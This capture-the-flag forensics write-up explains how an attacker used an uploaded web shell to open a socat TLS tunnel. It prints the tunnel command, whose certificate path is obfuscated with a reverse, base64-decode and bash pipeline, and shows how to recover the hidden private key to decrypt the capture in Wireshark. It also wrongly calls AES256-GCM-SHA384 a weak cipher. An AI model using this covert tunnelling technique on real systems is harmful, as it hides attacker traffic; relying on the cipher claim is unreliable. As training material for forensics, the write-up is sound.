
Attacker uploads web shell orion_shell.php and uses it to perform various commands

The packet capture shows the attackers HTTP traffic and then HTTPS traffic

The challengers must work out that the attacker has created an HTTPS tunnel using their webshell.

The command used to create the tunnel is shown in the pcap:
```
socat openssl-listen:31337,reuseaddr,cert=$(echo K0WZw5yboNWZtQ3Ylp2byBnLvITZoNWYwF2Ln9GbvIXY29CIvh2YltTblBnLvh2Yl1CdjVmavJHcu8iMlh2YhBXYvc2bs9ichZ3Lg0WZw5SZ0F2YpZWa0JXZj9CctR3LgYXb | rev | base64 -d | bash),verify=0,cipher=AES256-GCM-SHA384,fork tcp:localhost:12345
```

The attacker has obfuscated the cert value, which after performing a string reverse and base64 decoding shows the certificate located at:
```
/var/log/apache2/.project-echo.pem
```

The SSL cipher used to encrypt the traffic is weak `AES256-GCM-SHA384`, also TLS v1.2 is used (as shown in the pcap) meaning, only the private key is needed to decrypt the traffic. 

The `.project-echo.pem` contains the private key.

The challenger can copy the private key section of the .pem file and add the key to wireshark to decrypt the SSL traffic

Edit > Preferences > Protocols > TLS > RSA keys

The flag is located in the, now decrypted, traffic